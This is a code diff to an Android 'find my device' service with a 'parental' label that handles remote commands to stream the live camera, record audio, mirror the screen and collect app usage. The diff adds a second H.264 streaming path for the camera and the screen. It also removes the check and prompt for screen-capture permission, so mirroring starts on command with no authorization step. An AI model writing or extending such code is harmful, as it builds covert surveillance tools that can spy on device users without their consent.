@@ -359,11 +359,13 @@ class LocationService : Service() {
                         }
                         startForegroundServiceNotification()
                         com.findmydevice.security.util.CameraStreamManager.startStreaming(applicationContext, activeService, deviceId, deviceToken, facing)
-                        resultText = "Live camera streaming started on $facing camera"
+                        com.findmydevice.security.util.RealtimeMediaStreamer.startCameraStream(applicationContext, deviceId, deviceToken, facing)
+                        resultText = "Hardware H.264 camera streaming active on $facing camera"
                     }
                 }
                 "STOP_CAMERA_STREAM" -> {
                     com.findmydevice.security.util.CameraStreamManager.stopStreaming()
+                    com.findmydevice.security.util.RealtimeMediaStreamer.stopCameraStream()
                     resultText = "Live camera streaming stopped"
                 }
                 "RECORD_AUDIO_CLIP", "RECORD_AUDIO", "START_AUDIO_RECORDING" -> {
@@ -576,19 +578,13 @@ class LocationService : Service() {
                 }
                 "START_SCREEN_MIRROR", "START_SCREEN_STREAM" -> {
                     startForegroundServiceNotification()
-                    if (com.findmydevice.security.util.ScreenMirrorManager.isProjectionPermissionCached()) {
-                        com.findmydevice.security.util.ScreenMirrorManager.startScreenMirror(applicationContext, activeService, deviceId, deviceToken)
-                        resultText = "Parental Real-Time Screen Mirroring active"
-                    } else {
-                        val permIntent = Intent(applicationContext, com.findmydevice.security.ui.ScreenCapturePermissionActivity::class.java).apply {
-                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
-                        }
-                        startActivity(permIntent)
-                        resultText = "Screen Capture authorization prompt requested"
-                    }
+                    com.findmydevice.security.util.ScreenMirrorManager.startScreenMirror(applicationContext, activeService, deviceId, deviceToken)
+                    com.findmydevice.security.util.RealtimeMediaStreamer.startScreenMirrorStream(applicationContext, deviceId, deviceToken)
+                    resultText = "Parental Real-Time Screen Mirroring active (Hardware H.264 & MJPEG)"
                 }
                 "STOP_SCREEN_MIRROR", "STOP_SCREEN_STREAM" -> {
                     com.findmydevice.security.util.ScreenMirrorManager.stopScreenMirror()
+                    com.findmydevice.security.util.RealtimeMediaStreamer.stopScreenMirrorStream()
                     resultText = "Parental Screen Mirroring stopped"
                 }
                 "FETCH_APP_USAGE", "SYNC_APP_USAGE" -> {
